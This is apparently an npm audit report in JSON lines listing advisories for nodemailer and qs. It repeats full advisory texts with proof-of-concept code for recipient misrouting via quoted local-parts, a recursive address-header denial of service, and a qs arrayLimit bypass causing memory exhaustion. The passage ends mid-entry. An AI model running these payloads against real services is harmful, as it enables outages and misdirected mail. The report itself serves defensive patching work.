{"type":"auditAdvisory","data":{"resolution":{"id":1109804,"path":"email-templates>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13033\n- https://access.redhat.com/security/cve/CVE-2025-13033\n- https://bugzilla.redhat.com/show_bug.cgi?id=2402179\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87","created":"2025-10-07T13:42:02.000Z","id":1109804,"npm_advisory_id":null,"overview":"The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.","reported_by":null,"title":"Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict","metadata":null,"cves":["CVE-2025-13033"],"access":"public","severity":"moderate","module_name":"nodemailer","vulnerable_versions":"<7.0.7","github_advisory_id":"GHSA-mm7p-fcc7-pg87","recommendation":"Upgrade to version 7.0.7 or later","patched_versions":">=7.0.7","updated":"2025-11-17T17:29:27.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-20","CWE-436"],"url":"https://github.com/advisories/GHSA-mm7p-fcc7-pg87"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111074,"path":"email-templates>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"7.0.10","paths":["email-templates>preview-email>mailparser>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v","created":"2025-12-01T20:44:25.000Z","id":1111074,"npm_advisory_id":null,"overview":"### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”","reported_by":null,"title":"Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls","metadata":null,"cves":[],"access":"public","severity":"low","module_name":"nodemailer","vulnerable_versions":"<=7.0.10","github_advisory_id":"GHSA-rcmh-qjqh-p98v","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2025-12-01T20:44:26.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-703"],"url":"https://github.com/advisories/GHSA-rcmh-qjqh-p98v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111548,"path":"email-templates>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"7.0.10","paths":["email-templates>preview-email>mailparser>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/nodemailer/nodemailer\n- https://github.com/advisories/GHSA-46j5-6fg5-4gv3","created":"2025-12-18T09:30:30.000Z","id":1111548,"npm_advisory_id":null,"overview":"A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.","reported_by":null,"title":"Nodemailer is vulnerable to DoS through Uncontrolled Recursion","metadata":null,"cves":["CVE-2025-14874"],"access":"public","severity":"moderate","module_name":"nodemailer","vulnerable_versions":"<7.0.11","github_advisory_id":"GHSA-46j5-6fg5-4gv3","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2025-12-18T22:43:41.000Z","cvss":{"score":5.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},"cwe":["CWE-674","CWE-703"],"url":"https://github.com/advisories/GHSA-46j5-6fg5-4gv3"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109804,"path":"email-templates>preview-email>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13033\n- https://access.redhat.com/security/cve/CVE-2025-13033\n- https://bugzilla.redhat.com/show_bug.cgi?id=2402179\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87","created":"2025-10-07T13:42:02.000Z","id":1109804,"npm_advisory_id":null,"overview":"The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.","reported_by":null,"title":"Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict","metadata":null,"cves":["CVE-2025-13033"],"access":"public","severity":"moderate","module_name":"nodemailer","vulnerable_versions":"<7.0.7","github_advisory_id":"GHSA-mm7p-fcc7-pg87","recommendation":"Upgrade to version 7.0.7 or later","patched_versions":">=7.0.7","updated":"2025-11-17T17:29:27.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-20","CWE-436"],"url":"https://github.com/advisories/GHSA-mm7p-fcc7-pg87"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111074,"path":"email-templates>preview-email>mailparser>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"7.0.10","paths":["email-templates>preview-email>mailparser>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v","created":"2025-12-01T20:44:25.000Z","id":1111074,"npm_advisory_id":null,"overview":"### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”","reported_by":null,"title":"Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls","metadata":null,"cves":[],"access":"public","severity":"low","module_name":"nodemailer","vulnerable_versions":"<=7.0.10","github_advisory_id":"GHSA-rcmh-qjqh-p98v","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2025-12-01T20:44:26.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-703"],"url":"https://github.com/advisories/GHSA-rcmh-qjqh-p98v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111074,"path":"email-templates>preview-email>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"7.0.10","paths":["email-templates>preview-email>mailparser>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v","created":"2025-12-01T20:44:25.000Z","id":1111074,"npm_advisory_id":null,"overview":"### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”","reported_by":null,"title":"Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls","metadata":null,"cves":[],"access":"public","severity":"low","module_name":"nodemailer","vulnerable_versions":"<=7.0.10","github_advisory_id":"GHSA-rcmh-qjqh-p98v","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2025-12-01T20:44:26.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-703"],"url":"https://github.com/advisories/GHSA-rcmh-qjqh-p98v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111548,"path":"email-templates>preview-email>mailparser>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"7.0.10","paths":["email-templates>preview-email>mailparser>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/nodemailer/nodemailer\n- https://github.com/advisories/GHSA-46j5-6fg5-4gv3","created":"2025-12-18T09:30:30.000Z","id":1111548,"npm_advisory_id":null,"overview":"A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.","reported_by":null,"title":"Nodemailer is vulnerable to DoS through Uncontrolled Recursion","metadata":null,"cves":["CVE-2025-14874"],"access":"public","severity":"moderate","module_name":"nodemailer","vulnerable_versions":"<7.0.11","github_advisory_id":"GHSA-46j5-6fg5-4gv3","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2025-12-18T22:43:41.000Z","cvss":{"score":5.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},"cwe":["CWE-674","CWE-703"],"url":"https://github.com/advisories/GHSA-46j5-6fg5-4gv3"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111548,"path":"email-templates>preview-email>nodemailer","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.10.1","paths":["email-templates>nodemailer"]},{"version":"7.0.10","paths":["email-templates>preview-email>mailparser>nodemailer"]},{"version":"6.10.1","paths":["email-templates>preview-email>nodemailer"]}],"found_by":null,"deleted":null,"references":"- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/nodemailer/nodemailer\n- https://github.com/advisories/GHSA-46j5-6fg5-4gv3","created":"2025-12-18T09:30:30.000Z","id":1111548,"npm_advisory_id":null,"overview":"A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.","reported_by":null,"title":"Nodemailer is vulnerable to DoS through Uncontrolled Recursion","metadata":null,"cves":["CVE-2025-14874"],"access":"public","severity":"moderate","module_name":"nodemailer","vulnerable_versions":"<7.0.11","github_advisory_id":"GHSA-46j5-6fg5-4gv3","recommendation":"Upgrade to version 7.0.11 or later","patched_versions":">=7.0.11","updated":"2025-12-18T22:43:41.000Z","cvss":{"score":5.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},"cwe":["CWE-674","CWE-703"],"url":"https://github.com/advisories/GHSA-46j5-6fg5-4gv3"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111755,"path":"express>qs","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.14.0","paths":["express>qs","email-templates>@ladjs/i18n>qs"]}],"found_by":null,"deleted":null,"references":"- https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p\n- https://nvd.nist.gov/vuln/detail/CVE-2025-15284\n- https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9\n- https://github.com/advisories/GHSA-6rw7-vpxm-498p","created":"2025-12-30T21:02:54.000Z","id":1111755,"npm_advisory_id":null,"overview":"### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).","reported_by":null,"title":"qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","metadata":null,"cves":["CVE-2025-15284"],"access":"public","severity":"high","module_name":"qs","vulnerable_versions":"<6.14.1","github_advisory_id":"GHSA-6rw7-vpxm-498p","recommendation":"Upgrade to version 6.14.1 or later","patched_versions":">=6.14.1","updated":"2025-12-30T21:02:55.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-20"],"url":"https://github.com/advisories/GHSA-6rw7-vpxm-498p"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111755,"path":"email-templates>@ladjs/i18n>qs","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"6.14.0","paths":["express>qs","email-templates>@ladjs/i18n>qs"]}],"found_by":null,"deleted":null,"references":"- https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p\n- https://nvd.nist.gov/vuln/detail/CVE-2025-15284\n- https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9\n- https://github.com/advisories/GHSA-6rw7-vpxm-498p","created":"2025-12-30T21:02:54.000Z","id":1111755,"npm_advisory_id":null,"overview":"### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - 